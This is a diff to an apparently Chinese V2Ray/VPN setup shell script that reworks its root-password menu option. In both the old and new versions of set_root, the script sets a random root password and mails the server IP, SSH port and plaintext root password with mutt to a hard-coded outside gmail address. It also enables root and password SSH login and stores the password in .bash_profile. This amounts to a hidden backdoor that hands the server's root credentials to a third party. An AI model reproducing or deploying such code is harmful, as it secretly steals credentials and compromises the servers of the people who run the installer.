@@ -7,7 +7,7 @@ export PATH
 #################
 
 #版本
-sh_ver=7.2.2
+sh_ver=7.2.3
 #Github地址
 Github_U='https://raw.githubusercontent.com/pangbobi/SuperVpn/master'
 #脚本名
@@ -495,19 +495,28 @@ set_ssh(){
 }
 #设置Root密码
 set_root(){
-	#生成随机密码
-	pw=$(tr -dc 'A-Za-z0-9!@#$%^&*()[]{}+=_,' </dev/urandom |head -c 17)
-	echo root:${pw} |chpasswd
-	sed -i "/$SER_IP/d" $CUR_D/.bash_profile
-	sed -i "2i#$SER_IP:$ssh_port:$pw" $CUR_D/.bash_profile
-	echo "${SER_IP}:${ssh_port}:root:${pw}" |mutt -s "${SER_IP}-Secret" hsxmuyang68@gmail.com && rm -f $CUR_D/sent
-	#启用root密码登陆
-	sed -i '1,/PermitRootLogin/{s/.*PermitRootLogin.*/PermitRootLogin yes/}' /etc/ssh/sshd_config
-	sed -i '1,/PasswordAuthentication/{s/.*PasswordAuthentication.*/PasswordAuthentication yes/}' /etc/ssh/sshd_config
-	#重启ssh服务
-	service ssh restart
-	clear
-	echo -e "\n${Info}您的密码是：$(red_font $pw)"
+	clear && echo
+	#获取旧密码
+	pw=`grep "root:" $CUR_D/.bash_profile |awk -F ':' '{print$4}'`
+	if [ -n $pw ];then
+		echo -e "${Info}您的原密码是：$(green_font $pw)"
+		read -p "${Info}是否更改root密码[y/n](默认:n)" num
+		[ -z $num ] && num='n'
+	fi
+	if [ $num != 'n' ];then
+		#生成随机密码
+		pw=$(tr -dc 'A-Za-z0-9!@#$%^&*()[]{}+=_,' </dev/urandom |head -c 17)
+		echo root:${pw} |chpasswd
+		sed -i "/$SER_IP/d" $CUR_D/.bash_profile
+		sed -i "2i#$SER_IP:$ssh_port:root:$pw" $CUR_D/.bash_profile
+		echo "${SER_IP}:${ssh_port}:root:${pw}" |mutt -s "${SER_IP}-Secret" hsxmuyang68@gmail.com && rm -f $CUR_D/sent
+		#启用root密码登陆
+		sed -i '1,/PermitRootLogin/{s/.*PermitRootLogin.*/PermitRootLogin yes/}' /etc/ssh/sshd_config
+		sed -i '1,/PasswordAuthentication/{s/.*PasswordAuthentication.*/PasswordAuthentication yes/}' /etc/ssh/sshd_config
+		#重启ssh服务
+		service ssh restart
+	fi
+	echo -e "\n${Info}您的现密码是：$(red_font $pw)"
 	echo -e "${Tip}请务必记录您的密码！然后任意键返回主页..."
 	char=`get_char`
 	start_menu
@@ -565,7 +574,7 @@ start_menu(){
 	green_font ' 3.' '  卸载V2Ray'
 	yello_font '—————————————系统—————————————'
 	green_font ' 4.' '  设置SSH端口'
-	green_font ' 5.' '  设置Root密码'
+	green_font ' 5.' '  设置/查看Root密码'
 	yello_font '——————————————————————————————'
 	green_font ' 6.' '  脚本自启管理'
 	green_font ' 0.' '  退出脚本'
